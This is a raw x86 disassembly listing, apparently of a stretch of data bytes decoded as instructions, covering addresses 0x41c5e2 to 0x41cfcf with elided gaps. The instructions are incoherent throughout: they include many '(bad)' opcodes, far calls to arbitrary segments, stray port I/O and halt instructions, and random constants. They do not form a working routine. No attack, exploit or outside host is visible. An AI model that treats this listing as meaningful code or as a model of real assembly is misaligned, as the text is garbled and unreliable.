  41c5e2:	scas   eax,DWORD PTR es:[edi]
  41c5e3:	scas   al,BYTE PTR es:[edi]
  41c5e4:	jnp    0x41c5c1
  41c5e6:	scas   eax,DWORD PTR es:[edi]
  41c5e7:	sbb    BYTE PTR [ebx],0x53
  41c5ea:	ror    al,cl
  41c5ec:	push   0x24
	...
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xa9ab17a2
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	xchg   edx,eax
  41c66f:	sub    al,0xc
  41c671:	jae    0x41c6a2
  41c673:	cli    
  41c674:	sub    al,BYTE PTR [eax-0x16]
  41c677:	loopne 0x41c6e2
  41c679:	outs   dx,DWORD PTR ds:[esi]
  41c67a:	cmp    BYTE PTR [ecx-0x6c],cl
  41c67d:	mov    dl,0xaf
  41c67f:	push   ds
  41c680:	inc    esi
  41c681:	sbb    al,0x9a
  41c683:	push   edi
  41c684:	loop   0x41c6f6
  41c686:	sub    BYTE PTR [edi-0x7746221a],ah
  41c68c:	into   
  41c68d:	outs   dx,BYTE PTR ds:[esi]
  41c68e:	mov    dh,0x56
  41c690:	clc    
  41c691:	mov    ebp,0xb884f98c
  41c696:	sbb    BYTE PTR [eax+0x5be4f57d],dh
  41c69c:	int3   
  41c69d:	sub    al,0xf1
  41c69f:	pop    edx
  41c6a0:	leave  
  41c6a1:	sub    ecx,DWORD PTR [esi]
  41c6a3:	inc    eax
  41c6a4:	pop    esp
  41c6a5:	outs   dx,BYTE PTR ds:[esi]
  41c6a6:	dec    ecx
  41c6a7:	ror    BYTE PTR [edx+0x213f4fac],0xc1
  41c6ae:	mov    dl,0xa2
  41c6b0:	mov    WORD PTR [esi-0x4b8a6e3c],fs
  41c6b6:	and    ch,BYTE PTR [ecx]
  41c6b8:	sub    DWORD PTR [edi],ecx
  41c6ba:	jae    0x41c6a2
  41c6bc:	iret   
  41c6bd:	sub    DWORD PTR [esi],edx
  41c6bf:	js     0x41c6b5
  41c6c1:	cmp    edi,0x75
  41c6c4:	sbb    cl,BYTE PTR [edi+0x5f]
  41c6c7:	jb     0x41c68b
  41c6c9:	add    bh,bl
  41c6cb:	repnz add al,0x5
  41c6ce:	sbb    ecx,DWORD PTR ds:0xb954275d
  41c6d4:	adc    ebp,DWORD PTR [esi+0x7c]
  41c6d7:	mov    ah,0x1a
  41c6d9:	sar    BYTE PTR [ecx+edx*4+0x600dd573],1
  41c6e0:	push   edi
  41c6e1:	lahf   
  41c6e2:	test   BYTE PTR [esi-0x27],dh
  41c6e5:	cmp    al,0x50
  41c6e7:	mov    dh,0x25
  41c6e9:	add    eax,0xb5e03389
  41c6ee:	and    eax,DWORD PTR ds:0xa76a73a0
  41c6f4:	(bad)  
  41c6f5:	ss jge 0x41c70a
  41c6f8:	dec    eax
  41c6f9:	out    0xe5,al
  41c6fb:	js     0x41c692
  41c6fd:	cmp    al,0x93
  41c6ff:	push   ds
  41c700:	jns    0x41c6f8
  41c702:	sbb    al,0xb4
  41c704:	mov    ah,0x41
  41c706:	jecxz  0x41c6b2
  41c708:	push   ds
  41c709:	ret    
  41c70a:	es pushf 
  41c70c:	jno    0x41c6ce
  41c70e:	and    ebx,DWORD PTR [edx]
  41c710:	and    eax,0x6a942044
  41c715:	loopne 0x41c6a1
  41c717:	jecxz  0x41c6f6
  41c719:	pop    ebx
  41c71a:	mov    esp,0xbaea5a65
  41c71f:	jns    0x41c76a
  41c721:	(bad)
  41c724:	hlt    
  41c725:	in     eax,dx
  41c726:	out    0xe9,al
  41c728:	retf   
  41c729:	mov    ebx,0x528193b7
  41c72e:	inc    edx
  41c72f:	xchg   ecx,eax
  41c730:	fnstcw WORD PTR [eax+0x8]
  41c733:	aas    
  41c734:	test   eax,0xac9ea70d
  41c739:	sbb    al,0x3b
  41c73b:	mov    eax,0xce9fe8bc
  41c740:	cdq    
  41c741:	shl    BYTE PTR [ebx+eax*8+0x77b8a522],1
  41c748:	js     0x41c735
  41c74a:	mov    dl,0x49
  41c74c:	cmc    
  41c74d:	call   0x84e3:0xdd11f276
  41c754:	mov    ah,BYTE PTR [edx+0x76]
  41c757:	cmp    esp,DWORD PTR [edi+0x657f4350]
  41c75d:	mov    esp,0x9164aff
  41c762:	add    eax,0xdee0ddc
  41c767:	arpl   dx,di
  41c769:	push   edx
  41c76a:	mov    edx,0x71b104
	...
  41c7d3:	add    BYTE PTR [eax],al
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	push   cs
  41c7e3:	push   cs
  41c7e4:	xchg   esp,eax
  41c7e5:	push   ds
  41c7e6:	xor    al,BYTE PTR [bx+di]
  41c7e9:	add    BYTE PTR [eax],al
  41c7eb:	add    DWORD PTR [eax],eax
  41c7ed:	add    BYTE PTR [esi-0x18],dl
  41c7f0:	test   al,0xee
  41c7f2:	mov    bl,0x3d
  41c7f4:	(bad)  
  41c7f5:	push   ds
  41c7f6:	inc    ebx
  41c7f7:	mov    edx,0xcf8ca990
  41c7fc:	repnz dec edx
  41c7fe:	add    esi,DWORD PTR [ebx+0x2fa39e84]
  41c804:	pop    eax
  41c805:	inc    edx
  41c806:	push   ecx
  41c807:	add    ah,BYTE PTR ds:0x67d912f9
  41c80d:	cmp    BYTE PTR [edx],bl
  41c80f:	in     eax,dx
  41c810:	jmp    0x41c835
  41c812:	cmc    
  41c813:	lds    esp,FWORD PTR [edx+eiz*2]
  41c816:	das    
  41c817:	neg    BYTE PTR [ecx]
  41c819:	retf   
  41c81a:	and    eax,0x161e1a86
  41c81f:	xor    BYTE PTR [eax+0x602ce534],dh
  41c825:	clc    
  41c826:	inc    esp
  41c827:	adc    BYTE PTR [esi],dl
  41c829:	mov    eax,ds:0xfe799df0
  41c82e:	rol    BYTE PTR [ebp-0x4ef34d72],cl
  41c834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c835:	xor    BYTE PTR [edi+esi*8],bh
  41c838:	sub    bl,BYTE PTR [esi]
  41c83a:	push   sp
  41c83c:	imul   ebp,DWORD PTR [edx-0x79],0x1ca6f05b
  41c843:	(bad)  
  41c844:	push   0x208179c9
  41c849:	pop    ds
  41c84a:	rcr    BYTE PTR [ebp+0x44],cl
  41c84d:	popa   
  41c84e:	add    eax,DWORD PTR [ecx-0x57fccb57]
  41c854:	pop    edx
  41c855:	outs   dx,DWORD PTR ds:[esi]
  41c856:	les    ebp,FWORD PTR [ecx+0x6cb59e29]
  41c85c:	inc    edi
  41c85d:	jb     0x41c87d
  41c85f:	aam    0xf2
  41c861:	shl    esp,cl
  41c863:	rol    ecx,1
  41c865:	fadd   st,st(2)
  41c867:	mov    eax,0x2345efc8
  41c86c:	in     eax,0x73
  41c86e:	dec    ebp
  41c86f:	mov    edi,gs
  41c871:	push   ebx
  41c872:	gs jnp 0x41c8a0
  41c875:	test   BYTE PTR [edi+0x17],dl
  41c878:	adc    ch,dl
  41c87a:	sbb    ecx,DWORD PTR [ebx]
  41c87c:	fwait
  41c87d:	ja     0x41c8a1
  41c87f:	sbb    DWORD PTR [ecx],0x99c0e396
  41c885:	call   0x36:0x7ec0e400
  41c88c:	sub    al,0x8e
  41c88e:	ficom  DWORD PTR [esi-0x2e]
  41c891:	fimul  DWORD PTR [ebx+0x36cd72b9]
  41c897:	sbb    esp,edi
  41c899:	outs   dx,BYTE PTR ds:[esi]
  41c89a:	loopne 0x41c8b7
  41c89c:	test   al,0x8b
  41c89e:	fiadd  DWORD PTR [edx+0x36e5daac]
  41c8a4:	add    al,0xfe
  41c8a6:	and    esp,esp
  41c8a8:	ror    BYTE PTR [edi],1
  41c8aa:	stos   DWORD PTR es:[edi],eax
  41c8ab:	inc    ebx
  41c8ac:	push   di
  41c8ae:	xchg   DWORD PTR [ebp+0x12e8e637],esp
  41c8b4:	stos   BYTE PTR es:[edi],al
  41c8b5:	jae    0x41c892
  41c8b7:	rcl    DWORD PTR [edx],0xf0
  41c8ba:	mov    ch,0x65
  41c8bc:	jb     0x41c89b
  41c8be:	jno    0x41c910
  41c8c0:	jae    0x41c902
  41c8c2:	lock ja 0x41c8c7
  41c8c5:	in     al,dx
  41c8c6:	in     al,dx
  41c8c7:	or     edx,0x64ba344b
  41c8cd:	and    DWORD PTR [ebx-0x10],ebx
  41c8d0:	inc    edx
  41c8d1:	and    eax,0xaf5f6531
  41c8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d7:	in     al,0x51
  41c8d9:	addr16 or eax,0x80f3d840
  41c8df:	(bad)  
  41c8e0:	scas   al,BYTE PTR es:[edi]
  41c8e1:	inc    dh
  41c8e3:	cmp    ah,cl
  41c8e5:	shl    DWORD PTR [esi],0xb1
  41c8e8:	in     eax,dx
  41c8e9:	push   esp
  41c8ea:	call   0x68f34a
	...
  41c953:	add    BYTE PTR [eax],al
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	pop    ebp
  41c963:	dec    eax
  41c964:	push   ss
  41c965:	push   0x67
  41c967:	xor    eax,DWORD PTR [ecx]
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    DWORD PTR [eax],eax
  41c96d:	add    BYTE PTR [ebx],bl
  41c96f:	push   ebx
  41c970:	sbb    BYTE PTR [eax+0xd],dh
  41c973:	pop    esi
  41c974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c975:	loope  0x41c94d
  41c977:	lds    esi,FWORD PTR [edx-0x6ee43233]
  41c97d:	call   0xe3f2:0x8d0eec0b
  41c984:	xor    dh,BYTE PTR [edx+ebp*2+0x15]
  41c988:	or     eax,0x11e7cf
  41c98d:	inc    esi
  41c98e:	push   ebp
  41c98f:	mov    eax,0x78c708d2
  41c994:	mov    edx,0x5df2630e
  41c999:	repz xchg edx,eax
  41c99b:	outs   dx,BYTE PTR ds:[esi]
  41c99c:	nop
  41c99d:	nop
  41c99e:	test   DWORD PTR [ecx+0x4317fe61],ebp
  41c9a4:	mov    dl,BYTE PTR [edx+0x454d1bcb]
  41c9aa:	sti    
  41c9ab:	jo     0x41c972
  41c9ad:	icebp  
  41c9ae:	enter  0x4e01,0xde
  41c9b2:	shl    ebx,1
  41c9b4:	dec    edi
  41c9b5:	out    dx,eax
  41c9b6:	xor    eax,0xed3f4cba
  41c9bb:	les    esi,FWORD PTR [eax]
  41c9bd:	pop    es
  41c9be:	push   ss
  41c9bf:	pop    eax
  41c9c0:	jecxz  0x41ca0a
  41c9c2:	cld    
  41c9c3:	fcom   QWORD PTR [ebp+eax*1+0x57]
  41c9c7:	lds    edi,FWORD PTR [ebx+0x67]
  41c9ca:	cmp    ch,0x42
  41c9cd:	call   0xa8d3079e
  41c9d2:	mov    cl,0x54
  41c9d4:	push   edi
  41c9d5:	pop    esp
  41c9d6:	dec    ecx
  41c9d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9d8:	arpl   WORD PTR [ecx],dx
  41c9da:	push   0x43e9619e
  41c9df:	mov    edx,0xa2d0be5a
  41c9e4:	(bad)  
  41c9e5:	imul   BYTE PTR [edx+0x38]
  41c9e8:	push   ebp
  41c9e9:	scas   al,BYTE PTR es:[edi]
  41c9ea:	hlt    
  41c9eb:	adc    ecx,DWORD PTR [esp+ecx*1-0x1c]
  41c9ef:	aaa    
  41c9f0:	push   edi
  41c9f1:	outs   dx,DWORD PTR ds:[esi]
  41c9f2:	jle    0x41ca18
  41c9f4:	(bad)  
  41c9f5:	push   edi
  41c9f6:	into   
  41c9f7:	mov    ds:0x3f75305b,al
  41c9fc:	lahf   
  41c9fd:	mov    cl,0x77
  41c9ff:	pslld  mm3,mm6
  41ca02:	not    dh
  41ca04:	sbb    cl,BYTE PTR [edi]
  41ca06:	push   cs
  41ca07:	ret    0xc80
  41ca0a:	cmp    eax,0x53b2db18
  41ca0f:	hlt    
  41ca10:	dec    ebp
  41ca11:	mov    esp,DWORD PTR [esi+0x2f]
  41ca14:	aaa    
  41ca15:	pop    ds
  41ca16:	jnp    0x41ca74
  41ca18:	hlt    
  41ca19:	in     al,dx
  41ca1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca1b:	jmp    0x5be3e020
  41ca20:	pop    edx
  41ca21:	mov    dl,0x33
  41ca23:	push   edi
  41ca24:	xchg   edi,eax
  41ca25:	pop    ecx
  41ca26:	shr    ch,1
  41ca28:	dec    esp
  41ca29:	dec    esi
  41ca2a:	xor    bh,BYTE PTR [edi+0x1917641a]
  41ca30:	xor    ebx,DWORD PTR [ebp+edx*2-0x4e253521]
  41ca37:	in     eax,0x2b
  41ca39:	fnstenv [esi-0x371616f3]
  41ca3f:	xchg   esp,eax
  41ca40:	inc    ebx
  41ca41:	dec    BYTE PTR [ecx-0x65976e37]
  41ca47:	mov    edx,0xb9e8fc6f
  41ca4c:	popf   
  41ca4d:	pop    ss
  41ca4e:	xor    BYTE PTR [edx],dh
  41ca50:	xchg   ebx,eax
  41ca51:	aam    0x6e
  41ca53:	push   es
  41ca54:	and    eax,ebp
  41ca56:	pop    ecx
  41ca57:	add    al,0x73
  41ca59:	call   0x690f:0xc5696bc1
  41ca60:	(bad)  
  41ca61:	(bad)  
  41ca62:	sahf   
  41ca63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca64:	ret    
  41ca65:	(bad)  
  41ca66:	cmp    dl,BYTE PTR [ecx+0x22]
  41ca69:	stos   DWORD PTR es:[edi],eax
  41ca6a:	mov    esp,0x56774e
	...
  41cad3:	add    BYTE PTR [eax],al
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	or     edi,DWORD PTR [ebp+0xf]
  41cae5:	xor    BYTE PTR [edi+0x34],ah
  41cae8:	add    DWORD PTR [eax],eax
  41caea:	add    BYTE PTR [ecx],al
  41caec:	add    BYTE PTR [eax],al
  41caee:	add    eax,0x905c42cb
  41caf3:	dec    eax
  41caf4:	sahf   
  41caf5:	push   esp
  41caf6:	push   cs
  41caf7:	or     BYTE PTR [ecx+0x1e83cfe4],ah
  41cafd:	pop    ebx
  41cafe:	pop    edi
  41caff:	cmp    bh,BYTE PTR [edi+0x5cddfd63]
  41cb05:	jge    0x41cac7
  41cb07:	and    ebx,esp
  41cb09:	pop    ds
  41cb0a:	and    ebp,edi
  41cb0c:	mov    dl,0x32
  41cb0e:	scas   eax,DWORD PTR es:[edi]
  41cb0f:	pop    ecx
  41cb10:	cmc    
  41cb11:	pop    ds
  41cb12:	mov    al,ds:0x16df51ca
  41cb17:	dec    esi
  41cb18:	jmp    0x47b626cc
  41cb1d:	je     0x41cb76
  41cb1f:	sub    al,0xd6
  41cb21:	xchg   edx,eax
  41cb22:	and    dh,dl
  41cb24:	sbb    esi,edi
  41cb26:	xor    cl,0xcc
  41cb29:	aam    0x22
  41cb2b:	es call 0xdd1a0039
  41cb31:	mov    eax,ds:0xdc7f6ab7
  41cb36:	es push eax
  41cb38:	sub    dl,dh
  41cb3a:	es inc ecx
  41cb3c:	mov    BYTE PTR [edx-0x45000476],dh
  41cb42:	cmp    al,0x63
  41cb44:	jne    0x41cad2
  41cb46:	test   DWORD PTR [eax],esp
  41cb48:	fdivr  QWORD PTR [ebx+eiz*4]
  41cb4b:	mov    dh,0x39
  41cb4e:	add    eax,0x6d8ade48
  41cb53:	stc    
  41cb54:	arpl   WORD PTR [ebp+0x517aa518],ax
  41cb5a:	cwde   
  41cb5b:	mov    eax,ds:0xef6fc774
  41cb60:	sub    BYTE PTR gs:[ecx+0x4e99b203],dl
  41cb67:	xchg   edi,eax
  41cb68:	adc    BYTE PTR [edx+0x26],dh
  41cb6b:	out    dx,eax
  41cb6c:	imul   edi,DWORD PTR ds:0x41fbf2e9,0x22724709
  41cb76:	mov    esp,0x2d7d1fd2
  41cb7b:	inc    edi
  41cb7c:	mov    DWORD PTR [ebx-0xe43bcb1],ecx
  41cb82:	ss and al,0x91
  41cb85:	adc    BYTE PTR [ecx],ah
  41cb87:	ss aaa 
  41cb89:	or     DWORD PTR [edi+0x3c957617],ecx
  41cb8f:	xchg   ecx,eax
  41cb90:	and    al,0x75
  41cb92:	fmul   st(2),st
  41cb94:	mov    gs:0xaffdd4e2,al
  41cb9a:	xor    eax,0x8a88fa40
  41cb9f:	dec    esp
  41cba0:	jnp    0x41cb7e
  41cba2:	data16 jno 0x41cb62
  41cba5:	stc    
  41cba6:	dec    edx
  41cba7:	aaa    
  41cba8:	jbe    0x41cb6b
  41cbaa:	out    dx,eax
  41cbab:	fmul   QWORD PTR ds:0x7694736c
  41cbb1:	sar    BYTE PTR [esp+ebp*8-0xf],cl
  41cbb5:	push   edi
  41cbb6:	mov    al,ds:0x2321e1eb
  41cbbb:	clc    
  41cbbc:	mov    edi,fs
  41cbbe:	fmul   DWORD PTR [edx]
  41cbc0:	ret    
  41cbc1:	call   0xfbd6a9c8
  41cbc6:	out    dx,eax
  41cbc7:	or     eax,DWORD PTR [eax+0x18adb699]
  41cbcd:	xor    al,0x3f
  41cbcf:	gs popa 
  41cbd1:	stc    
  41cbd2:	out    dx,al
  41cbd3:	xchg   DWORD PTR [ecx+edi*1],eax
  41cbd6:	dec    ebx
  41cbd7:	sub    al,0xb3
  41cbd9:	sar    dl,cl
  41cbdb:	sbb    al,0x8d
  41cbdd:	mov    cl,0x1d
  41cbdf:	jmp    0x41cc53
  41cbe1:	cmp    ch,BYTE PTR [ebp+0x4e]
  41cbe4:	push   esp
  41cbe5:	aas    
  41cbe6:	lahf   
  41cbe7:	cmp    eax,0xb629
  41cbec:	add    cl,dh
	...
  41cc56:	sub    esi,edx
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x42bf522
  41cc65:	add    esp,DWORD PTR [edi+0x35]
  41cc68:	add    DWORD PTR [eax],eax
  41cc6a:	add    BYTE PTR [ecx],al
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	inc    esp
  41cc6f:	out    0x38,eax
  41cc71:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41cc73:	sahf   
  41cc74:	js     0x41ccba
  41cc76:	and    eax,0x8e22bcb8
  41cc7b:	stc    
  41cc7c:	not    DWORD PTR [ecx-0x5]
  41cc7f:	bswap  esp
  41cc81:	imul   ebx,DWORD PTR [ecx],0xc843080
  41cc87:	mov    cl,0xe0
  41cc89:	xchg   DWORD PTR [edi+0x2c00a06f],eax
  41cc8f:	lea    eax,[ecx-0x7a09233]
  41cc95:	cmp    DWORD PTR [esi],edx
  41cc97:	mov    esp,DWORD PTR [ebx]
  41cc99:	and    al,0x1a
  41cc9b:	sti    
  41cc9c:	sub    DWORD PTR [ebp-0x5a],eax
  41cc9f:	cli    
  41cca0:	push   ecx
  41cca1:	jl     0x41cd0b
  41cca3:	cmc    
  41cca4:	in     al,dx
  41cca5:	fld    TBYTE PTR [edx-0x3c443886]
  41ccab:	cmp    eax,0x10d38161
  41ccb0:	push   ebx
  41ccb1:	loopne 0x41cc51
  41ccb3:	in     al,dx
  41ccb4:	(bad)  
  41ccb5:	xchg   ebx,eax
  41ccb6:	push   cs
  41ccb7:	faddp  st(4),st
  41ccb9:	sahf   
  41ccba:	lahf   
  41ccbb:	(bad)  
  41ccbc:	sti    
  41ccbd:	pop    ebp
  41ccbe:	dec    esp
  41ccbf:	test   al,ch
  41ccc1:	jle    0x41cce3
  41ccc3:	imul   esi,DWORD PTR [edi],0xfffffff9
  41ccc6:	jl     0x41cc7c
  41ccc8:	push   ds
  41ccc9:	imul   ebp,edi,0x63
  41cccc:	scas   eax,DWORD PTR es:[edi]
  41cccd:	mov    dh,0x83
  41cccf:	xchg   esi,eax
  41ccd0:	adc    al,0xd5
  41ccd2:	xchg   BYTE PTR [edx],dh
  41ccd4:	adc    eax,0x7217adcb
  41ccd9:	loopne 0x41ccf9
  41ccdb:	data16 xor BYTE PTR [edx+0x4511a13f],dl
  41cce2:	pop    edx
  41cce3:	mulps  xmm0,XMMWORD PTR ds:0x8aaef426
  41ccea:	je     0x41cd48
  41ccec:	mov    dl,BYTE PTR [esi]
  41ccee:	stc    
  41ccef:	and    esi,DWORD PTR [edi]
  41ccf1:	jb     0x41ccaa
  41ccf3:	cmp    DWORD PTR [esi],ebp
  41ccf5:	jmp    0x41cd29
  41ccf7:	sub    eax,ecx
  41ccf9:	mov    ds:0xacd43f86,eax
  41ccfe:	adc    ebx,DWORD PTR [ebp-0x12d0ab36]
  41cd04:	sbb    al,0x9d
  41cd06:	clc    
  41cd07:	not    BYTE PTR [eax]
  41cd09:	stos   DWORD PTR es:[edi],eax
  41cd0a:	xchg   esp,eax
  41cd0b:	or     edx,0xffffffae
  41cd0e:	xor    DWORD PTR [esi+0x216456e1],0x59
  41cd15:	pop    esp
  41cd16:	mov    bl,0x48
  41cd18:	pop    ebp
  41cd19:	pop    esp
  41cd1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd1c:	mov    dl,0xac
  41cd1e:	daa    
  41cd1f:	inc    ebp
  41cd20:	fidivr DWORD PTR [edi+0x43]
  41cd23:	pop    esi
  41cd24:	xor    DWORD PTR [ecx+0x6f],esi
  41cd27:	pop    ecx
  41cd28:	mov    ds:0x59cf919a,eax
  41cd2d:	imul   eax,DWORD PTR [ebx],0x57e1c483
  41cd33:	icebp  
  41cd34:	or     bl,0x53
  41cd37:	xor    ch,0x78
  41cd3a:	cmp    eax,0xfbeaebf1
  41cd3f:	(bad)  
  41cd40:	inc    ebp
  41cd41:	call   0x875:0xcdfdf63a
  41cd48:	aad    0x84
  41cd4a:	pop    esp
  41cd4b:	dec    ebx
  41cd4c:	mov    esp,0x95255613
  41cd51:	stos   BYTE PTR es:[edi],al
  41cd52:	lea    ebx,[esi+0x34]
  41cd55:	xchg   ebp,eax
  41cd56:	repz sub al,ah
  41cd59:	inc    esi
  41cd5a:	jo     0x41ccfa
  41cd5c:	xchg   ebx,eax
  41cd5d:	pop    ebx
  41cd5e:	sbb    BYTE PTR [ecx-0x22],bl
  41cd61:	cmp    eax,0x44b1f95
  41cd66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd67:	mov    eax,ds:0x6d894503
  41cd6c:	stc    
  41cd6d:	inc    esi
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	or     DWORD PTR [ebx+0x4],ebx
  41cde5:	pushf  
  41cde6:	add    DWORD PTR ss:[bx+si],eax
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	mul    DWORD PTR [esi-0x24]
  41cdf1:	ret    
  41cdf2:	imul   edi,DWORD PTR [ebx-0x1a],0xea91c11e
  41cdf9:	adc    cl,BYTE PTR [eax-0x47]
  41cdfc:	dec    ecx
  41cdfd:	sub    al,0xb8
  41cdff:	test   ebp,ecx
  41ce01:	mov    bl,0x60
  41ce03:	data16 jo 0x41cdcc
  41ce06:	sbb    cl,BYTE PTR [edi+eax*1]
  41ce09:	inc    esp
  41ce0a:	cwde   
  41ce0b:	and    BYTE PTR [ebx],ah
  41ce0d:	aad    0x8e
  41ce0f:	fcom   QWORD PTR [edi-0x41e35a93]
  41ce15:	in     al,dx
  41ce16:	cmp    eax,0xe7862655
  41ce1b:	pop    esi
  41ce1c:	push   esi
  41ce1d:	mov    ebp,0xbdd31a1c
  41ce22:	lods   al,BYTE PTR ds:[esi]
  41ce23:	std    
  41ce24:	ins    DWORD PTR es:[edi],dx
  41ce25:	cs pop ss
  41ce27:	mov    esi,0x6e6d3506
  41ce2c:	pop    edx
  41ce2d:	mov    ebp,0x19bc9fc7
  41ce32:	imul   esp,esp,0xffffffbe
  41ce35:	stc    
  41ce36:	xor    al,BYTE PTR [ebx]
  41ce38:	ins    BYTE PTR es:[edi],dx
  41ce39:	leave  
  41ce3a:	loopne 0x41ce42
  41ce3c:	adc    eax,0x3bfcfef6
  41ce41:	jno    0x41cdea
  41ce43:	(bad)  
  41ce44:	pop    esp
  41ce45:	jb     0x41cde9
  41ce47:	iret   
  41ce48:	into   
  41ce49:	(bad)  
  41ce4a:	and    eax,0x8c9b7919
  41ce4f:	scas   al,BYTE PTR es:[edi]
  41ce50:	mov    bl,0xbf
  41ce52:	mov    DWORD PTR [ecx+0xeb6f596],esp
  41ce58:	sbb    esi,DWORD PTR [ebp-0x1f]
  41ce5b:	push   0x2d883738
  41ce60:	repnz out dx,al
  41ce62:	mov    ah,0x50
  41ce64:	jo     0x41ceaa
  41ce66:	and    al,0xcb
  41ce68:	and    cl,dh
  41ce6a:	loop   0x41cec6
  41ce6c:	dec    esp
  41ce6d:	jmp    0x75ba6f27
  41ce72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce73:	idiv   DWORD PTR [edi+ecx*8]
  41ce76:	mov    bh,0x29
  41ce78:	dec    esi
  41ce79:	loopne 0x41cec9
  41ce7b:	push   ds
  41ce7c:	jne    0x41ce26
  41ce7e:	sub    al,0xb7
  41ce80:	nop
  41ce81:	scas   al,BYTE PTR es:[edi]
  41ce82:	ins    DWORD PTR es:[edi],dx
  41ce83:	jo     0x41cedd
  41ce85:	fucomi st,st(6)
  41ce87:	sub    esi,edx
  41ce89:	jge    0x41cea2
  41ce8b:	pushf  
  41ce8c:	mov    eax,0x6f42fefd
  41ce91:	inc    ecx
  41ce92:	pop    es
  41ce93:	pop    esp
  41ce94:	cmp    BYTE PTR [edx-0x3e],dh
  41ce97:	loopne 0x41cee5
  41ce99:	and    ecx,DWORD PTR [ebp-0x4b8c38b1]
  41ce9f:	nop
  41cea0:	dec    esi
  41cea1:	aam    0x4e
  41cea3:	sbb    dl,BYTE PTR [esi-0x27a70730]
  41cea9:	dec    edi
  41ceaa:	add    edx,esp
  41ceac:	mov    ebx,0xdd37907d
  41ceb1:	pop    ecx
  41ceb2:	dec    ecx
  41ceb3:	icebp  
  41ceb4:	cmp    eax,0x1d284c53
  41ceb9:	jns    0x41cf2f
  41cebb:	mov    dl,0x9
  41cebd:	push   ss
  41cebe:	jmp    0x2fce9a31
  41cec3:	out    dx,al
  41cec4:	inc    esi
  41cec5:	inc    ebp
  41cec6:	rol    BYTE PTR [eax+0x3b1b010c],1
  41cecc:	jo     0x41ce8f
  41cece:	frstor [esi+0x18]
  41ced1:	out    dx,eax
  41ced2:	sbb    BYTE PTR [ebp+0x344999c5],dl
  41ced8:	icebp  
  41ced9:	sbb    eax,0x94ac378f
  41cede:	repnz and DWORD PTR [edi+0x54],ecx
  41cee2:	into   
  41cee3:	pop    esp
  41cee4:	sbb    ch,0xbe
  41cee7:	dec    ecx
  41cee8:	test   al,0x9f
  41ceea:	add    cl,BYTE PTR [ebx]
  41ceec:	dec    eax
  41ceed:	push   es
	...
  41cf56:	pop    es
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	xchg   ebp,eax
  41cf63:	adc    eax,0x376765b9
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	or     al,0x98
  41cf70:	mov    esp,0xda5c1188
  41cf75:	or     BYTE PTR ds:[ecx-0x7f],dl
  41cf79:	jp     0x41cf40
  41cf7b:	pop    es
  41cf7c:	pop    esi
  41cf7d:	fucomi st,st(5)
  41cf7f:	mov    eax,ds:0xe37b5f40
  41cf84:	mov    ecx,0x4e937f50
  41cf89:	dec    esi
  41cf8a:	mov    ch,0xe2
  41cf8c:	lods   eax,DWORD PTR ds:[esi]
  41cf8d:	inc    esi
  41cf8e:	enter  0xdb85,0x46
  41cf92:	jle    0x41cfdc
  41cf94:	push   ebp
  41cf95:	(bad)  
  41cf96:	lahf   
  41cf97:	pop    eax
  41cf98:	aaa    
  41cf99:	int    0x95
  41cf9b:	and    ecx,edx
  41cf9d:	leave  
  41cf9e:	sub    ebx,edx
  41cfa0:	sub    cl,BYTE PTR ds:0xa1b3d1ed
  41cfa6:	push   esp
  41cfa7:	jecxz  0x41cfd7
  41cfa9:	aam    0xc9
  41cfab:	nop
  41cfac:	mov    ebp,0x3eff90cf
  41cfb1:	addr16 jmp 0x4625914a
  41cfb7:	mov    eax,0x86306134
  41cfbc:	inc    esp
  41cfbd:	out    0x19,eax
  41cfbf:	mov    ah,0x26
  41cfc1:	sbb    DWORD PTR [esi-0x3078e502],esi
  41cfc7:	(bad)  
  41cfc8:	jno    0x41cf57
  41cfca:	jmp    0x41d047
  41cfcc:	shl    DWORD PTR [eax],cl
  41cfce:	pop    ebx
  41cfcf:	bound  esp,QWORD PTR [ecx-0x44]
